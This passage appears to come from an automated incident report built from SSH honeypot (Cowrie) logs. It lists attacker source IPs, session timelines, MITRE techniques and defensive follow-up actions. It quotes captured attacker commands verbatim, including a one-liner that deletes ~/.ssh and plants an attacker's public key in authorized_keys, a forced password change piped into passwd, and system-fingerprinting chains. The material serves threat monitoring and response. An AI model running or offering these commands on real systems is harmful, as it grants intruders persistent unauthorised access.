| `2026-07-24 07:47:41` | `cowrie.session.connect` |
| `2026-07-24 07:47:41` | `cowrie.client.version` |
| `2026-07-24 07:47:41` | `cowrie.client.kex` |
| `2026-07-24 07:47:41` | `cowrie.login.success` |
| `2026-07-24 07:47:42` | `cowrie.session.params` |
| `2026-07-24 07:47:42` | `cowrie.command.input` |
| `2026-07-24 07:47:42` | `cowrie.log.closed` |
| `2026-07-24 07:47:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86cd807437b9

| Field | Detail |
|---|---|
| **Source IP** | `106.1.10[.]110` |
| **First Seen** | 2026-07-24 07:48 |
| **Last Seen** | 2026-07-24 07:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:48:44` | `cowrie.session.connect` |
| `2026-07-24 07:48:45` | `cowrie.client.version` |
| `2026-07-24 07:48:45` | `cowrie.client.kex` |
| `2026-07-24 07:48:47` | `cowrie.login.success` |
| `2026-07-24 07:48:48` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.1.10[.]110` to AbuseIPDB if not already reported
- [ ] Block `106.1.10[.]110` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a0704031efa

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-24 07:48 |
| **Last Seen** | 2026-07-24 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:48:53` | `cowrie.session.connect` |
| `2026-07-24 07:48:54` | `cowrie.client.version` |
| `2026-07-24 07:48:54` | `cowrie.client.kex` |
| `2026-07-24 07:48:56` | `cowrie.login.success` |
| `2026-07-24 07:48:57` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0898b26fec

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:49 |
| **Last Seen** | 2026-07-24 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:49:31` | `cowrie.session.connect` |
| `2026-07-24 07:49:31` | `cowrie.client.version` |
| `2026-07-24 07:49:31` | `cowrie.client.kex` |
| `2026-07-24 07:49:32` | `cowrie.login.success` |
| `2026-07-24 07:49:32` | `cowrie.session.params` |
| `2026-07-24 07:49:32` | `cowrie.command.input` |
| `2026-07-24 07:49:32` | `cowrie.log.closed` |
| `2026-07-24 07:49:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483b2fae0bc0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:49 |
| **Last Seen** | 2026-07-24 07:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:49:32` | `cowrie.session.connect` |
| `2026-07-24 07:49:32` | `cowrie.client.version` |
| `2026-07-24 07:49:33` | `cowrie.client.kex` |
| `2026-07-24 07:49:34` | `cowrie.login.success` |
| `2026-07-24 07:49:36` | `cowrie.session.params` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.success` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:36` | `cowrie.command.input` |
| `2026-07-24 07:49:37` | `cowrie.log.closed` |
| `2026-07-24 07:49:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb5fd0803b83

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:17` | `cowrie.session.connect` |
| `2026-07-24 07:51:17` | `cowrie.client.version` |
| `2026-07-24 07:51:17` | `cowrie.client.kex` |
| `2026-07-24 07:51:18` | `cowrie.login.success` |
| `2026-07-24 07:51:19` | `cowrie.session.params` |
| `2026-07-24 07:51:19` | `cowrie.command.input` |
| `2026-07-24 07:51:19` | `cowrie.command.failed` |
| `2026-07-24 07:51:19` | `cowrie.log.closed` |
| `2026-07-24 07:51:20` | `cowrie.session.params` |
| `2026-07-24 07:51:20` | `cowrie.command.input` |
| `2026-07-24 07:51:21` | `cowrie.session.file_download` |
| `2026-07-24 07:51:21` | `cowrie.log.closed` |
| `2026-07-24 07:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e061d897ce4a

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:21` | `cowrie.session.connect` |
| `2026-07-24 07:51:21` | `cowrie.client.version` |
| `2026-07-24 07:51:21` | `cowrie.client.kex` |
| `2026-07-24 07:51:22` | `cowrie.login.success` |
| `2026-07-24 07:51:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68054a9d1347

| Field | Detail |
|---|---|
| **Source IP** | `222.107.156[.]227` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:22` | `cowrie.session.connect` |
| `2026-07-24 07:51:22` | `cowrie.client.version` |
| `2026-07-24 07:51:22` | `cowrie.client.kex` |
| `2026-07-24 07:51:23` | `cowrie.login.success` |
| `2026-07-24 07:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.107.156[.]227` to AbuseIPDB if not already reported
- [ ] Block `222.107.156[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f86d32f18389

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:25` | `cowrie.session.connect` |
| `2026-07-24 07:51:25` | `cowrie.client.version` |
| `2026-07-24 07:51:25` | `cowrie.client.kex` |
| `2026-07-24 07:51:25` | `cowrie.login.success` |
| `2026-07-24 07:51:26` | `cowrie.session.params` |
| `2026-07-24 07:51:26` | `cowrie.command.input` |
| `2026-07-24 07:51:26` | `cowrie.log.closed` |
| `2026-07-24 07:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c23c5fa06d54

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:36` | `cowrie.session.connect` |
| `2026-07-24 07:51:36` | `cowrie.client.version` |
| `2026-07-24 07:51:36` | `cowrie.client.kex` |
| `2026-07-24 07:51:38` | `cowrie.login.success` |
| `2026-07-24 07:51:39` | `cowrie.session.params` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.success` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:39` | `cowrie.command.input` |
| `2026-07-24 07:51:40` | `cowrie.log.closed` |
| `2026-07-24 07:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59b45519cfef

| Field | Detail |
|---|---|
| **Source IP** | `124.167.20[.]72` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:38` | `cowrie.session.connect` |
| `2026-07-24 07:51:38` | `cowrie.client.version` |
| `2026-07-24 07:51:38` | `cowrie.client.kex` |
| `2026-07-24 07:51:41` | `cowrie.login.success` |
| `2026-07-24 07:51:42` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:51:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.167.20[.]72` to AbuseIPDB if not already reported
- [ ] Block `124.167.20[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5561dfa40df1

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-07-24 07:51 |
| **Last Seen** | 2026-07-24 07:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:51:47` | `cowrie.session.connect` |
| `2026-07-24 07:51:48` | `cowrie.client.version` |
| `2026-07-24 07:51:48` | `cowrie.client.kex` |
| `2026-07-24 07:51:49` | `cowrie.login.success` |
| `2026-07-24 07:51:49` | `cowrie.direct-tcpip.request` |
| `2026-07-24 07:51:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1c7177c11a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:05` | `cowrie.session.connect` |
| `2026-07-24 07:53:05` | `cowrie.client.version` |
| `2026-07-24 07:53:05` | `cowrie.client.kex` |
| `2026-07-24 07:53:05` | `cowrie.login.success` |
| `2026-07-24 07:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6cb5ad670f2

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:05` | `cowrie.session.connect` |
| `2026-07-24 07:53:05` | `cowrie.client.version` |
| `2026-07-24 07:53:05` | `cowrie.client.kex` |
| `2026-07-24 07:53:05` | `cowrie.login.success` |
| `2026-07-24 07:53:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-582edf85bd3b

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:12` | `cowrie.session.connect` |
| `2026-07-24 07:53:12` | `cowrie.client.version` |
| `2026-07-24 07:53:12` | `cowrie.client.kex` |
| `2026-07-24 07:53:12` | `cowrie.login.success` |
| `2026-07-24 07:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae296f0d081

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:12` | `cowrie.session.connect` |
| `2026-07-24 07:53:12` | `cowrie.client.version` |
| `2026-07-24 07:53:12` | `cowrie.client.kex` |
| `2026-07-24 07:53:12` | `cowrie.login.success` |
| `2026-07-24 07:53:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a91f7ebbba4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:13` | `cowrie.session.connect` |
| `2026-07-24 07:53:13` | `cowrie.client.version` |
| `2026-07-24 07:53:13` | `cowrie.client.kex` |
| `2026-07-24 07:53:14` | `cowrie.login.success` |
| `2026-07-24 07:53:15` | `cowrie.session.params` |
| `2026-07-24 07:53:15` | `cowrie.command.input` |
| `2026-07-24 07:53:15` | `cowrie.log.closed` |
| `2026-07-24 07:53:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b131741cc952

| Field | Detail |
|---|---|
| **Source IP** | `213.131.64[.]123` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:54 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "09N1RCa1Hs31\nj3WQ0nS5bkxD\nj3WQ0nS5bkxD"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:16` | `cowrie.session.connect` |
| `2026-07-24 07:53:16` | `cowrie.client.version` |
| `2026-07-24 07:53:16` | `cowrie.client.kex` |
| `2026-07-24 07:53:16` | `cowrie.login.success` |
| `2026-07-24 07:53:17` | `cowrie.session.params` |
| `2026-07-24 07:53:17` | `cowrie.command.input` |
| `2026-07-24 07:53:17` | `cowrie.command.failed` |
| `2026-07-24 07:53:17` | `cowrie.log.closed` |
| `2026-07-24 07:53:18` | `cowrie.session.params` |
| `2026-07-24 07:53:18` | `cowrie.command.input` |
| `2026-07-24 07:53:18` | `cowrie.session.file_download` |
| `2026-07-24 07:53:18` | `cowrie.log.closed` |
| `2026-07-24 07:53:47` | `cowrie.session.params` |
| `2026-07-24 07:53:47` | `cowrie.command.input` |
| `2026-07-24 07:53:47` | `cowrie.log.closed` |
| `2026-07-24 07:53:48` | `cowrie.session.params` |
| `2026-07-24 07:53:48` | `cowrie.command.input` |
| `2026-07-24 07:53:48` | `cowrie.command.input` |
| `2026-07-24 07:53:48` | `cowrie.command.failed` |
| `2026-07-24 07:53:48` | `cowrie.log.closed` |
| `2026-07-24 07:53:49` | `cowrie.session.params` |
| `2026-07-24 07:53:49` | `cowrie.command.input` |
| `2026-07-24 07:53:49` | `cowrie.log.closed` |
| `2026-07-24 07:53:50` | `cowrie.session.params` |
| `2026-07-24 07:53:50` | `cowrie.command.input` |
| `2026-07-24 07:53:50` | `cowrie.log.closed` |
| `2026-07-24 07:53:51` | `cowrie.session.params` |
| `2026-07-24 07:53:51` | `cowrie.command.input` |
| `2026-07-24 07:53:51` | `cowrie.log.closed` |
| `2026-07-24 07:53:52` | `cowrie.session.params` |
| `2026-07-24 07:53:52` | `cowrie.command.input` |
| `2026-07-24 07:53:52` | `cowrie.command.input` |
| `2026-07-24 07:53:52` | `cowrie.log.closed` |
| `2026-07-24 07:53:53` | `cowrie.session.params` |
| `2026-07-24 07:53:53` | `cowrie.command.input` |
| `2026-07-24 07:53:53` | `cowrie.log.closed` |
| `2026-07-24 07:53:54` | `cowrie.session.params` |
| `2026-07-24 07:53:54` | `cowrie.command.input` |
| `2026-07-24 07:53:54` | `cowrie.log.closed` |
| `2026-07-24 07:53:55` | `cowrie.session.params` |
| `2026-07-24 07:53:55` | `cowrie.command.input` |
| `2026-07-24 07:53:55` | `cowrie.log.closed` |
| `2026-07-24 07:53:56` | `cowrie.session.params` |
| `2026-07-24 07:53:56` | `cowrie.command.input` |
| `2026-07-24 07:53:56` | `cowrie.log.closed` |
| `2026-07-24 07:53:57` | `cowrie.session.params` |
| `2026-07-24 07:53:57` | `cowrie.command.input` |
| `2026-07-24 07:53:57` | `cowrie.log.closed` |
| `2026-07-24 07:53:58` | `cowrie.session.params` |
| `2026-07-24 07:53:58` | `cowrie.command.input` |
| `2026-07-24 07:53:58` | `cowrie.log.closed` |
| `2026-07-24 07:53:59` | `cowrie.session.params` |
| `2026-07-24 07:53:59` | `cowrie.command.input` |
| `2026-07-24 07:53:59` | `cowrie.log.closed` |
| `2026-07-24 07:54:00` | `cowrie.session.params` |
| `2026-07-24 07:54:00` | `cowrie.command.input` |
| `2026-07-24 07:54:00` | `cowrie.log.closed` |
| `2026-07-24 07:54:01` | `cowrie.session.params` |
| `2026-07-24 07:54:01` | `cowrie.command.input` |
| `2026-07-24 07:54:01` | `cowrie.log.closed` |
| `2026-07-24 07:54:02` | `cowrie.session.params` |
| `2026-07-24 07:54:02` | `cowrie.command.input` |
| `2026-07-24 07:54:02` | `cowrie.log.closed` |
| `2026-07-24 07:54:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.131.64[.]123` to AbuseIPDB if not already reported
- [ ] Block `213.131.64[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75583f509006

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-07-24 07:53 |
| **Last Seen** | 2026-07-24 07:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 07:53:35` | `cowrie.session.connect` |
| `2026-07-24 07:53:35` | `cowrie.client.version` |
| `2026-07-24 07:53:35` | `cowrie.client.kex` |
| `2026-07-24 07:53:37` | `cowrie.login.success` |
| `2026-07-24 07:53:39` | `cowrie.session.params` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.success` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.command.input` |
| `2026-07-24 07:53:39` | `cowrie.log.closed` |
| `2026-07-24 07:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
